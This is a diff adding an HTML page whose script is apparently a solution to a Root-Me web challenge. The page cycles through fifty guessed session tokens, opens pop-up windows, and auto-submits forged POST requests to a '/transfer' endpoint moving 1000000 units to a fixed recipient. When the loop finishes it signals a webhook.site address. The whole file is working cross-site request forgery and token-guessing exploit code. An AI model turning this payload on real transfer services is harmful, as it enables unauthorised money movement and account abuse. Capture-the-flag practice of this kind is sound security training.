@@ -1,0 +1,26 @@
+<!DOCTYPE html><html><body><script>
+var toks = ["6a6b3e900cac920c000000", "6a6b3e910cac920c000000", "6a6b3e920cac920c000000", "6a6b3e930cac920c000000", "6a6b3e940cac920c000000", "6a6b3e950cac920c000000", "6a6b3e960cac920c000000", "6a6b3e970cac920c000000", "6a6b3e980cac920c000000", "6a6b3e990cac920c000000", "6a6b3e9a0cac920c000000", "6a6b3e9b0cac920c000000", "6a6b3e9c0cac920c000000", "6a6b3e9d0cac920c000000", "6a6b3e9e0cac920c000000", "6a6b3e9f0cac920c000000", "6a6b3ea00cac920c000000", "6a6b3ea10cac920c000000", "6a6b3ea20cac920c000000", "6a6b3ea30cac920c000000", "6a6b3ea40cac920c000000", "6a6b3ea50cac920c000000", "6a6b3ea60cac920c000000", "6a6b3ea70cac920c000000", "6a6b3ea80cac920c000000", "6a6b3ea90cac920c000000", "6a6b3eaa0cac920c000000", "6a6b3eab0cac920c000000", "6a6b3eac0cac920c000000", "6a6b3ead0cac920c000000", "6a6b3eae0cac920c000000", "6a6b3eaf0cac920c000000", "6a6b3eb00cac920c000000", "6a6b3eb10cac920c000000", "6a6b3eb20cac920c000000", "6a6b3eb30cac920c000000", "6a6b3eb40cac920c000000", "6a6b3eb50cac920c000000", "6a6b3eb60cac920c000000", "6a6b3eb70cac920c000000", "6a6b3eb80cac920c000000", "6a6b3eb90cac920c000000", "6a6b3eba0cac920c000000", "6a6b3ebb0cac920c000000", "6a6b3ebc0cac920c000000", "6a6b3ebd0cac920c000000", "6a6b3ebe0cac920c000000", "6a6b3ebf0cac920c000000", "6a6b3ec00cac920c000000", "6a6b3ec10cac920c000000"];
+var BASE = "https://instance-019fb2ec-c4c9-71f3-b9e4-40c0d5571bed.challenges.root-me.pro";
+var i = 0;
+function fireNext() {
+  if (i >= toks.length) {
+    var img = document.createElement("img");
+    img.src = "https://webhook.site/f5af0355-1e19-423e-8665-14603d26667f?beacon=popbatch2_done";
+    document.body.appendChild(img);
+    return;
+  }
+  var w = window.open("about:blank", "_blank");
+  if (w) {
+    var f = w.document.createElement("form");
+    f.action = BASE + "/transfer";
+    f.method = "POST";
+    f.innerHTML = "<input name=token value=" + toks[i] + "><input name=recipient value=pbtgt_1785415344><input name=amount value=1000000>";
+    w.document.body.appendChild(f);
+    f.submit();
+    setTimeout(function(win){ try { win.close(); } catch(e){} }, 600, w);
+  }
+  i++;
+  setTimeout(fireNext, 250);
+}
+fireNext();
+</script></body></html>
